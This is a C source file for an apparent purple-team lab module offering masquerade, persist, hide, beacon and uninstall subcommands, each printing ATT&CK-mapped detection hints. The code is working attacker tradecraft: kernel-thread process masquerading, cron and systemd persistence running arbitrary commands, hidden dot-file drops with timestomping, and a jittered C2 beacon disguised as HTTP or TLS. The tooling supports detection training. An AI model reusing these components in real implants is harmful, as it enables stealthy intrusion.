/*
 * wetland — purple-team lab module (see wld_lab.h).
 *
 * Subcommands:  wld lab <masquerade|persist|hide|beacon|uninstall|detections>
 *
 * All artifacts are tagged WETLAND-LAB and are removable with `wld lab
 * uninstall`. Techniques are deliberately observable; each one prints an
 * ATT&CK-mapped detection hint after running.
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include "wld_lab.h"
#include "wld_compat.h"
#include "wld_net.h"
#include "wld_autotunnel.h"

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define LAB_MARKER   "WETLAND-LAB"
#define LAB_DROP     ".wetland-lab"        /* dropped dot-file (under $HOME)   */
#define LAB_LOG      ".wetland-lab.log"    /* heartbeat log (under $HOME)      */
#define LAB_UNIT     "wetland-lab.service" /* systemd --user unit name         */

/* Recognised lab subcommands: "lab" (verbose form) + technique shortcuts. */
static const char *const lab_cmds[] = {
	"lab", "masquerade", "persist", "hide", "beacon", "uninstall",
	"detections", NULL
};

int
wld_lab_is_command(const char *arg)
{
	for (int i = 0; lab_cmds[i] != NULL; i++)
		if (strcmp(arg, lab_cmds[i]) == 0) return 1;
	return 0;
}

#ifdef _WIN32

int
wld_lab_main(int argc, char **argv)
{
	(void)argc; (void)argv;
	fprintf(stderr, "wld lab: the purple-team lab module is POSIX-only "
	    "(run it on Linux/macOS).\n");
	return 1;
}

void wld_proc_masquerade(char **argv, int argc, const char *name)
{
	(void)argv; (void)argc; (void)name; /* no-op on Windows */
}

#else /* ---------------------------------------------------------------- POSIX */

#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/time.h>
#ifdef __APPLE__
#  include <mach-o/dyld.h>
#endif
#ifdef __linux__
#  include <sys/prctl.h>
#endif

/* ---- helpers ------------------------------------------------------------ */

static void
labf(const char *fmt, ...)
{
	va_list ap;
	fputs("[wetland-lab] ", stderr);
	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
}

/* strdup of $HOME/<name>, or NULL. Caller frees. */
static char *
home_path(const char *name)
{
	const char *h = getenv("HOME");
	if (h == NULL || h[0] == '\0') return NULL;
	size_t n = strlen(h) + 1 + strlen(name) + 1;
	char *p = malloc(n);
	if (p == NULL) return NULL;
	snprintf(p, n, "%s/%s", h, name);
	return p;
}

/* Absolute path to this executable. Caller frees, or NULL.
 * Linux: /proc/self/exe. macOS: _NSGetExecutablePath (+ realpath). Fallback:
 * argv[0] if it looks like a path. */
static char *
self_path(const char *argv0)
{
#ifdef __APPLE__
	uint32_t sz = 0;
	_NSGetExecutablePath(NULL, &sz);
	char *p = sz ? malloc(sz) : NULL;
	if (p != NULL && _NSGetExecutablePath(p, &sz) == 0) {
		char *rp = realpath(p, NULL);
		if (rp != NULL) { free(p); return rp; }
		return p;
	}
	free(p);
#endif
	char buf[4096];
	ssize_t r = readlink("/proc/self/exe", buf, sizeof buf - 1);
	if (r > 0) { buf[r] = '\0'; return strdup(buf); }
	/* macOS / fallback: trust argv[0] if it looks like a path */
	if (argv0 && strchr(argv0, '/')) return strdup(argv0);
	return argv0 ? strdup(argv0) : NULL;
}

/* case-insensitive option match */
static int
is_opt(const char *a, const char *name)
{
	return strcmp(a, name) == 0;
}

/* ---- detection hints ---------------------------------------------------- */

static void
hint_masquerade(void)
{
	fputs(
"\n  ── detection hint ───────────────────────────────────────────\n"
"  ATT&CK : T1036.004 (Masquerade Task/Service) / T1036.005 (Match\n"
"           Legitimate Name) \n"
"  IOCs   : process comm looks like a kernel thread (e.g. [kworker])\n"
"           but has a real executable backing it and a heap/\n"
"           stack+mapped libs (genuine kthreads have none).\n"
#ifdef __APPLE__
"  Hunt   : ps -axo pid,comm | grep -E '^ *[0-9]+ \\['   # find fake kthreads\n"
"           then: ps -p <pid> -o args   and   lsof -p <pid> | grep txt\n"
"           (a genuine kernel task has no userland executable mapped).\n"
#else
"  Hunt   : for p in /proc/[0-9]*; do n=$(tr -d '\\0' <$p/comm);\n"
"           case $n in \\[*\\]) readlink $p/exe 2>/dev/null && \\\n"
"             echo \"FAKE KTHREAD: $p ($n)\";; esac; done\n"
#endif
"  EDR    : argv[0] != backing file name; PR_SET_NAME via prctl.\n"
"  ─────────────────────────────────────────────────────────────\n", stderr);
}

static void
hint_persist(void)
{
	fputs(
"\n  ── detection hint ───────────────────────────────────────────\n"
"  ATT&CK : T1053.003 (Cron) / T1543.002 (systemd user service)\n"
"  IOCs   : new @reboot crontab line tagged " LAB_MARKER ";\n"
"           ~/.config/systemd/user/" LAB_UNIT " created + enabled.\n"
"  Hunt   : crontab -l | grep " LAB_MARKER "\n"
"           systemctl --user list-unit-files | grep wetland-lab\n"
"           auditd: watch ~/.config/systemd/user and crontab writes.\n"
"  ─────────────────────────────────────────────────────────────\n", stderr);
}

static void
hint_hide(void)
{
	fputs(
"\n  ── detection hint ───────────────────────────────────────────\n"
"  ATT&CK : T1564.001 (Hidden Files) / T1070.006 (Timestomp)\n"
"  IOCs   : executable dot-file in $HOME; mtime copied from a system\n"
"           binary while ctime stays 'now' (timestomp can't fake ctime).\n"
"  Hunt   : find ~ -maxdepth 1 -name '.*' -type f -perm -u+x\n"
#ifdef __APPLE__
"           stat -f '%N mtime=%m ctime=%c' ~/.wetland-lab   # ctime>>mtime\n"
#else
"           stat -c '%n mtime=%Y ctime=%Z' ~/.wetland-lab   # ctime>>mtime\n"
#endif
"  ─────────────────────────────────────────────────────────────\n", stderr);
}

static void
hint_beacon(void)
{
	fputs(
"\n  ── detection hint ───────────────────────────────────────────\n"
"  ATT&CK : T1071.001 (Web C2) / T1573 (Encrypted Channel) /\n"
"           T1571 (Non-Standard Port) / T1008 (Fallback Channels)\n"
"  Model  : centralized C2 — the implant checks in to a C2 server on a\n"
"           fixed cadence (+/- jitter). --as shapes the check-in:\n"
"             raw  = opaque bytes (encrypted-channel look)\n"
"             http = GET request with a browser UA (web C2)\n"
"             tls  = TLS-ClientHello-shaped bytes (odd/own JA3)\n"
"  IOCs   : periodic outbound to one host; low bytes-up/down ratio;\n"
"           as=http -> fixed UA / odd URI; as=tls -> ClientHello that no\n"
"           real browser sent (JA3/JARM mismatch); as=raw on :443 ->\n"
"           bytes on 443 with no TLS handshake at all.\n"
"  Hunt   : NetFlow/Zeek beaconing by connection-interval regularity;\n"
"           JA3/JARM allow-listing; UA + URI entropy; dest-IP rarity.\n"
"  ─────────────────────────────────────────────────────────────\n", stderr);
}

/* ---- technique: masquerade ---------------------------------------------- */

/*
 * Rewrite this process's visible name (T1036): the kernel comm via prctl, and
 * the contiguous argv region so `ps`/`/proc/pid/cmdline` show `name` instead of
 * `./wld ...`. `name` is copied first because argv memory is wiped. Reusable by
 * the `wld lab masquerade` technique and the client's `-M` flag.
 */
void
wld_proc_masquerade(char **argv, int argc, const char *name)
{
	if (name == NULL || argv == NULL || argc < 1) return;
	char fake[256];
	snprintf(fake, sizeof fake, "%s", name);
#ifdef __linux__
	prctl(PR_SET_NAME, fake, 0, 0, 0);
#endif
	char *start = argv[0];
	char *end   = argv[argc - 1] + strlen(argv[argc - 1]) + 1;
	size_t span = (size_t)(end - start);
	if (span > 1) {
		memset(start, 0, span);
		strncpy(start, fake, span - 1);
	}
}

static int
do_masquerade(int argc, char **argv, char **origv, int origc)
{
	const char *name = "[kworker/0:0]";
	long duration = 300;
	for (int i = 0; i < argc; i++) {
		if (is_opt(argv[i], "--name") && i + 1 < argc) name = argv[++i];
		else if (is_opt(argv[i], "--duration") && i + 1 < argc)
			duration = atol(argv[++i]);
		else { labf("masquerade: unknown arg '%s'", argv[i]); return 2; }
	}

	char fake[256];
	snprintf(fake, sizeof fake, "%s", name);

	char orig[64] = "?";
#ifdef __linux__
	prctl(PR_GET_NAME, orig, 0, 0, 0);
#endif
	labf("masquerade: pid=%ld original comm='%s' argv0='%s'",
	    (long)getpid(), orig, origv[0]);

	wld_proc_masquerade(origv, origc, fake);

	labf("masquerade: now presenting as '%s' for %lds "
	    "(check: ps -p %ld -o pid,comm,args)", fake, duration, (long)getpid());
	hint_masquerade();

	if (duration > 0) sleep((unsigned)duration);
	return 0;
}

/* ---- technique: persist ------------------------------------------------- */

/* Read an entire stream into a malloc'd NUL-terminated buffer. */
static char *
slurp(FILE *f)
{
	size_t cap = 4096, len = 0;
	char *b = malloc(cap);
	if (b == NULL) return NULL;
	size_t r;
	while ((r = fread(b + len, 1, cap - len - 1, f)) > 0) {
		len += r;
		if (len + 1 >= cap) {
			cap *= 2;
			char *nb = realloc(b, cap);
			if (nb == NULL) { free(b); return NULL; }
			b = nb;
		}
	}
	b[len] = '\0';
	return b;
}

static int
install_cron(const char *cmd)
{
	/*
	 * Build the new crontab by piping to `crontab -`, writing `cmd` as
	 * literal bytes (never through a shell) so quotes/$()/redirs in the
	 * payload are NOT reinterpreted at install time. Idempotent: existing
	 * WETLAND-LAB lines are dropped first.
	 */
	FILE *r = popen("crontab -l 2>/dev/null", "r");
	char *existing = r ? slurp(r) : strdup("");
	if (r) pclose(r);
	if (existing == NULL) { labf("cron: out of memory"); return -1; }

	FILE *w = popen("crontab -", "w");
	if (w == NULL) { labf("cron: cannot run crontab (installed?)"); free(existing); return -1; }

	/* re-emit existing lines, minus our own marker lines */
	for (char *line = existing, *nl; line && *line; line = nl ? nl + 1 : NULL) {
		nl = strchr(line, '\n');
		size_t ll = nl ? (size_t)(nl - line) : strlen(line);
		char *m = strstr(line, LAB_MARKER);
		int has_marker = (m != NULL && (size_t)(m - line) < ll);
		if (!has_marker) {
			fwrite(line, 1, ll, w);
			fputc('\n', w);
		}
		if (!nl) break;
	}
	fprintf(w, "@reboot %s # %s\n", cmd, LAB_MARKER);

	int rc = pclose(w);
	free(existing);
	if (rc != 0) {
		labf("persist[cron]: crontab write returned %d "
		     "(no cron spool/daemon on this host? line still intended)", rc);
		return -1;
	}
	labf("persist[cron]: added '@reboot <payload> # %s'", LAB_MARKER);
	return 0;
}

static int
install_systemd(const char *cmd)
{
	char *dir = home_path(".config/systemd/user");
	char *unit = home_path(".config/systemd/user/" LAB_UNIT);
	if (dir == NULL || unit == NULL) { free(dir); free(unit); return -1; }

	char mk[2048];
	snprintf(mk, sizeof mk, "mkdir -p '%s'", dir);
	if (system(mk) != 0) { labf("systemd: mkdir failed"); goto err; }

	FILE *f = fopen(unit, "w");
	if (f == NULL) { labf("systemd: cannot write %s: %s", unit, strerror(errno)); goto err; }
	fprintf(f,
	    "[Unit]\n"
	    "Description=%s purple-team persistence simulation (T1543.002)\n\n"
	    "[Service]\n"
	    "Type=simple\n"
	    "ExecStart=%s\n"
	    "Restart=no\n\n"
	    "[Install]\n"
	    "WantedBy=default.target\n",
	    LAB_MARKER, cmd);
	fclose(f);
	labf("persist[systemd]: wrote %s", unit);

	if (system("systemctl --user daemon-reload >/dev/null 2>&1 && "
	           "systemctl --user enable --now " LAB_UNIT " >/dev/null 2>&1") != 0)
		labf("persist[systemd]: unit written but enable failed "
		     "(no user systemd session? artifact still on disk)");
	else
		labf("persist[systemd]: enabled --now " LAB_UNIT);

	free(dir); free(unit);
	return 0;
err:
	free(dir); free(unit);
	return -1;
}

static int
do_persist(int argc, char **argv)
{
	const char *method = "both";
	const char *cmd = NULL;
	char *defcmd = NULL;

	for (int i = 0; i < argc; i++) {
		if (is_opt(argv[i], "--method") && i + 1 < argc) method = argv[++i];
		else if (is_opt(argv[i], "--exec") && i + 1 < argc) cmd = argv[++i];
		else { labf("persist: unknown arg '%s'", argv[i]); return 2; }
	}
	if (cmd == NULL) {
		/* default payload: harmless, observable heartbeat into $HOME */
		char *log = home_path(LAB_LOG);
		if (log == NULL) { labf("persist: $HOME not set"); return 1; }
		size_t n = strlen(log) + 128;
		defcmd = malloc(n);
		if (defcmd == NULL) { free(log); return 1; }
		snprintf(defcmd, n,
		    "/bin/sh -c 'echo %s heartbeat $(date -u +%%FT%%TZ) >> %s'",
		    LAB_MARKER, log);
		cmd = defcmd;
		free(log);
	}

	labf("persist: method=%s exec=%s", method, cmd);
	int ok = 0, want = 0;
	if (strcmp(method, "cron") == 0 || strcmp(method, "both") == 0)
		{ want++; if (install_cron(cmd) == 0) ok++; }
	if (strcmp(method, "systemd") == 0 || strcmp(method, "both") == 0)
		{ want++; if (install_systemd(cmd) == 0) ok++; }
	if (want == 0) { labf("persist: --method must be cron|systemd|both"); free(defcmd); return 2; }

	hint_persist();
	labf("persist: run `wld lab uninstall` to remove.");
	free(defcmd);
	return ok > 0 ? 0 : 1;
}

/* ---- technique: hide + timestomp ---------------------------------------- */

static int
do_hide(int argc, char **argv, const char *argv0)
{
	const char *ref = "/bin/ls";
	char *dest = NULL, *destbuf = NULL;
	for (int i = 0; i < argc; i++) {
		if (is_opt(argv[i], "--dest") && i + 1 < argc) dest = argv[++i];
		else if (is_opt(argv[i], "--reference") && i + 1 < argc) ref = argv[++i];
		else { labf("hide: unknown arg '%s'", argv[i]); return 2; }
	}
	if (dest == NULL) {
		destbuf = home_path(LAB_DROP);
		if (destbuf == NULL) { labf("hide: $HOME not set"); return 1; }
		dest = destbuf;
	}

	char *src = self_path(argv0);
	if (src == NULL) { labf("hide: cannot resolve own path"); free(destbuf); return 1; }

	/* copy self -> hidden dot-file (T1564.001) */
	char cp[8200];
	snprintf(cp, sizeof cp, "cp -f '%s' '%s'", src, dest);
	if (system(cp) != 0) { labf("hide: copy failed"); free(src); free(destbuf); return 1; }
	chmod(dest, 0755);
	labf("hide: dropped %s -> %s (executable dot-file)", src, dest);

	/* timestomp: steal mtime/atime from a system binary (T1070.006) */
	struct stat st;
	if (stat(ref, &st) == 0) {
		/* Darwin names these st_*timespec; Linux names them st_*tim.
		 * utimes() takes timeval, so one code path serves both. */
#if defined(__APPLE__)
		struct timespec at = st.st_atimespec, mt = st.st_mtimespec;
#else
		struct timespec at = st.st_atim, mt = st.st_mtim;
#endif
		struct timeval tv[2];
		tv[0].tv_sec  = at.tv_sec;
		tv[0].tv_usec = (suseconds_t)(at.tv_nsec / 1000);
		tv[1].tv_sec  = mt.tv_sec;
		tv[1].tv_usec = (suseconds_t)(mt.tv_nsec / 1000);
		if (utimes(dest, tv) == 0)
			labf("hide: timestomped mtime/atime from %s (%ld)",
			    ref, (long)st.st_mtime);
		else
			labf("hide: timestomp failed: %s", strerror(errno));
	} else {
		labf("hide: reference %s not found, skipped timestomp", ref);
	}
	labf("hide: note ctime is now != mtime (timestomp cannot fake ctime).");

	hint_hide();
	free(src); free(destbuf);
	return 0;
}

/* ---- technique: beacon -------------------------------------------------- */

static volatile int g_stop = 0;
#include <signal.h>
static void on_sigint(int s) { (void)s; g_stop = 1; }

/* Build one beacon payload shaped as raw/http/tls. Returns its length. */
static long
beacon_payload(unsigned char *buf, size_t cap, const char *as,
               const char *host, long rawsize)
{
	if (strcmp(as, "http") == 0) {
		/* looks like web C2 traffic (T1071.001) */
		int n = snprintf((char *)buf, cap,
		    "GET /%08x HTTP/1.1\r\nHost: %s\r\n"
		    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
		    "Accept: */*\r\nConnection: keep-alive\r\n\r\n",
		    (unsigned)rand(), host);
		return (n > 0 && (size_t)n < cap) ? n : 0;
	}
	if (strcmp(as, "tls") == 0) {
		/* minimal TLS-record-shaped bytes: a ClientHello-looking prefix so an
		 * L7/JA3 parser sees "TLS on this port" but an odd/own fingerprint */
		size_t body = 60;
		if (body + 9 > cap) body = cap - 9;
		unsigned char *p = buf;
		*p++ = 0x16; *p++ = 0x03; *p++ = 0x01;          /* Handshake, TLS 1.0 rec */
		*p++ = (unsigned char)((body + 4) >> 8); *p++ = (unsigned char)((body + 4) & 0xff);
		*p++ = 0x01;                                    /* ClientHello */
		*p++ = 0x00; *p++ = (unsigned char)(body >> 8); *p++ = (unsigned char)(body & 0xff);
		for (size_t i = 0; i < body; i++) p[i] = (unsigned char)rand();
		return (long)(9 + body);
	}
	/* raw: opaque random bytes (encrypted-channel look) */
	if (rawsize < 1) rawsize = 1;
	if ((size_t)rawsize > cap) rawsize = (long)cap;
	for (long i = 0; i < rawsize; i++) buf[i] = (unsigned char)rand();
	return rawsize;
}

static int
do_beacon(int argc, char **argv)
{
	const char *host = NULL, *port = "443";
	const char *as = "raw", *profile = NULL;
	long interval = 30, jitter = 20, count = 0, size = 64;
	int iv_set = 0, jt_set = 0;
	for (int i = 0; i < argc; i++) {
		if (is_opt(argv[i], "--to") && i + 1 < argc) {
			char *s = argv[++i];
			char *c = strrchr(s, ':');
			if (c) { *c = '\0'; host = s; port = c + 1; }
			else host = s;
		}
		else if (is_opt(argv[i], "--interval") && i + 1 < argc) { interval = atol(argv[++i]); iv_set = 1; }
		else if (is_opt(argv[i], "--jitter") && i + 1 < argc) { jitter = atol(argv[++i]); jt_set = 1; }
		else if (is_opt(argv[i], "--count") && i + 1 < argc) count = atol(argv[++i]);
		else if (is_opt(argv[i], "--size") && i + 1 < argc) size = atol(argv[++i]);
		else if (is_opt(argv[i], "--as") && i + 1 < argc) as = argv[++i];
		else if (is_opt(argv[i], "--profile") && i + 1 < argc) profile = argv[++i];
		else { labf("beacon: unknown arg '%s'", argv[i]); return 2; }
	}
	if (host == NULL) { labf("beacon: need --to HOST[:PORT]"); return 2; }
	if (strcmp(as, "raw") && strcmp(as, "http") && strcmp(as, "tls")) {
		labf("beacon: --as must be raw|http|tls"); return 2;
	}
	/* C2 cadence presets; explicit --interval/--jitter still win */
	if (profile != NULL) {
		if      (strcmp(profile, "hourly") == 0)     { if (!iv_set) interval = 3600; if (!jt_set) jitter = 15; }
		else if (strcmp(profile, "aggressive") == 0) { if (!iv_set) interval = 10;   if (!jt_set) jitter = 30; }
		else if (strcmp(profile, "lowslow") == 0)    { if (!iv_set) interval = 1800; if (!jt_set) jitter = 50; }
		else { labf("beacon: --profile must be hourly|aggressive|lowslow"); return 2; }
	}
	if (size < 1) size = 1;
	if (size > 4096) size = 4096;
	if (interval < 1) interval = 1;
	if (jitter < 0) jitter = 0;
	if (jitter > 90) jitter = 90;

	if (wld_net_startup() != 0) { labf("beacon: net init failed"); return 1; }
	signal(SIGINT, on_sigint);
	srand((unsigned)(time(NULL) ^ getpid()));

	labf("beacon: C2 -> %s:%s every %lds +/-%ld%% as=%s%s%s count=%s",
	    host, port, interval, jitter, as,
	    profile ? " profile=" : "", profile ? profile : "",
	    count ? "(fixed)" : "inf (Ctrl-C to stop)");
	hint_beacon();

	unsigned char *buf = malloc(4096);
	if (buf == NULL) return 1;

	long sent = 0;
	while (!g_stop && (count == 0 || sent < count)) {
		int fd = wld_tcp_connect(host, port);
		char ts[32]; time_t now = time(NULL);
		strftime(ts, sizeof ts, "%H:%M:%S", localtime(&now));
		if (fd >= 0) {
			long n = beacon_payload(buf, 4096, as, host, size);
			wld_write_all(fd, buf, (size_t)n);
			char rb[256];
			(void)wld_sock_read(fd, rb, sizeof rb); /* read tasking, best-effort */
			wld_closesocket(fd);
			labf("beacon #%ld @%s: check-in %ldB (%s) to %s:%s", sent + 1, ts, n, as, host, port);
		} else {
			labf("beacon #%ld @%s: C2 %s:%s unreachable", sent + 1, ts, host, port);
		}
		sent++;
		if (count && sent >= count) break;

		/* interval +/- jitter% */
		long j = (jitter > 0) ? (interval * jitter / 100) : 0;
		long delay = interval + (j ? (rand() % (2 * j + 1)) - j : 0);
		if (delay < 1) delay = 1;
		for (long s = 0; s < delay && !g_stop; s++) sleep(1);
	}
	free(buf);
	labf("beacon: stopped after %ld check-in(s).", sent);
	return 0;
}

/* ---- uninstall ---------------------------------------------------------- */

static int
do_uninstall(void)
{
	int removed = 0;

	/* cron */
	char sh[512];
	snprintf(sh, sizeof sh,
	    "crontab -l 2>/dev/null | grep -q '%s' && "
	    "( crontab -l 2>/dev/null | grep -v '%s' | crontab - ) && "
	    "echo removed", LAB_MARKER, LAB_MARKER);
	if (system(sh) == 0) { labf("uninstall: cleaned cron marker lines"); removed++; }

	/* systemd */
	char *unit = home_path(".config/systemd/user/" LAB_UNIT);
	if (unit) {
		int rc1 = system("systemctl --user disable --now " LAB_UNIT " >/dev/null 2>&1");
		if (unlink(unit) == 0) { labf("uninstall: removed %s", unit); removed++; }
		int rc2 = system("systemctl --user daemon-reload >/dev/null 2>&1");
		(void)rc1; (void)rc2;
		free(unit);
	}

	/* dropped file + heartbeat log */
	char *drop = home_path(LAB_DROP);
	char *log  = home_path(LAB_LOG);
	if (drop && unlink(drop) == 0) { labf("uninstall: removed %s", drop); removed++; }
	if (log  && unlink(log)  == 0) { labf("uninstall: removed %s", log);  removed++; }
	free(drop); free(log);

	labf("uninstall: %d artifact group(s) removed.", removed);
	return 0;
}

/* ---- usage / dispatch --------------------------------------------------- */

static int
lab_usage(void)
{
	fputs(
"wld lab — purple-team lab: documented, reversible evasion simulations\n"
"\n"
"  !! AUTHORIZED LAB USE ONLY. Every technique is loud, tagged " LAB_MARKER ",\n"
"     and removable with `wld lab uninstall`. Not a stealth implant.\n"
"\n"
"usage: wld lab <technique> [options]\n"
"   or: wld <technique> [options]        (shortcut, e.g. `wld persist`)\n"
"\n"
"  masquerade [--name NAME] [--duration SECS]\n"
"      T1036: present as a kernel-thread/system name (default [kworker/0:0]),\n"
"      hold for SECS (default 300) so it is observable in ps/top.\n"
"\n"
"  persist [--method cron|systemd|both] [--exec CMD]\n"
"      T1053.003 / T1543.002: install a @reboot cron line and/or a\n"
"      systemd --user unit. Default CMD is a harmless heartbeat to\n"
"      ~/" LAB_LOG ".\n"
"\n"
"  hide [--dest PATH] [--reference /bin/ls]\n"
"      T1564.001 / T1070.006: copy self to an executable dot-file and\n"
"      timestomp it from a system binary.\n"
"\n"
"  beacon --to HOST[:PORT] [--interval S] [--jitter PCT] [--count N]\n"
"         [--size B] [--as raw|http|tls] [--profile hourly|aggressive|lowslow]\n"
"      T1071/T1573/T1571: centralized-C2 check-ins to a C2 server on a\n"
"      jittered cadence (default :443, 30s, 20%). --as shapes the traffic\n"
"      (raw bytes / web GET / TLS-ClientHello-shaped). NOT real TLS.\n"
"\n"
"  uninstall        remove every " LAB_MARKER " artifact this tool creates.\n"
"  detections       print the ATT&CK -> detection mapping for all techniques.\n"
"\n"
"  --tunnel         (any technique) also open the zero-config public tunnel\n"
"                   (same as `wld -l`: embedded relay + pinggy/bore/frp), and\n"
"                   print the public host:port.\n",
	    stderr);
	return 1;
}

int
wld_lab_main(int argc, char **argv)
{
	/*
	 * argv is the full process argv. Two accepted layouts:
	 *   wld lab <technique> [opts]   -> technique at argv[2]
	 *   wld <technique> [opts]       -> technique at argv[1]  (shortcut)
	 */
	int ti = (argc >= 2 && strcmp(argv[1], "lab") == 0) ? 2 : 1;
	if (argc <= ti) return lab_usage();
	const char *tech = argv[ti];

	/* Pull out an optional, explicit `--tunnel`: brings up the embedded relay
	 * + zero-config public tunnel (same as `wld -l`) before the technique runs,
	 * so a lab command can be reached from outside. Opt-in, printed, not wired
	 * into `-l`. The remaining args are passed through to the technique. */
	int want_tunnel = 0;
	int raw_argc = argc - (ti + 1);
	char **raw = argv + (ti + 1);
	char **sub_argv = malloc(sizeof(char *) * (size_t)(raw_argc + 1));
	if (sub_argv == NULL) return 1;
	int sub_argc = 0;
	for (int i = 0; i < raw_argc; i++) {
		if (strcmp(raw[i], "--tunnel") == 0) { want_tunnel = 1; continue; }
		sub_argv[sub_argc++] = raw[i];
	}
	sub_argv[sub_argc] = NULL;

	if (want_tunnel) {
		static char lport[16], pubhost[256];
		int pubport = 0; long exp = 0;
		if (wld_open_tunnel("wld-lab", 1, lport, sizeof lport,
		    pubhost, sizeof pubhost, &pubport, &exp) == 0)
			labf("tunnel up — public %s:%d (reaches the embedded relay)",
			    pubhost, pubport);
		else
			labf("tunnel failed; continuing local-only");
	}

	int rc;
	if (strcmp(tech, "masquerade") == 0)
		rc = do_masquerade(sub_argc, sub_argv, argv, argc);
	else if (strcmp(tech, "persist") == 0)
		rc = do_persist(sub_argc, sub_argv);
	else if (strcmp(tech, "hide") == 0)
		rc = do_hide(sub_argc, sub_argv, argv[0]);
	else if (strcmp(tech, "beacon") == 0)
		rc = do_beacon(sub_argc, sub_argv);
	else if (strcmp(tech, "uninstall") == 0)
		rc = do_uninstall();
	else if (strcmp(tech, "detections") == 0) {
		fprintf(stderr, "wld lab — ATT&CK detection mapping\n");
		hint_masquerade(); hint_persist(); hint_hide(); hint_beacon();
		rc = 0;
	}
	else if (strcmp(tech, "help") == 0 || strcmp(tech, "-h") == 0)
		rc = lab_usage();
	else {
		labf("unknown technique '%s'", tech);
		rc = lab_usage();
	}

	free(sub_argv);
	if (want_tunnel) wld_tunnel_drain_all(10000);
	return rc;
}

#endif /* POSIX */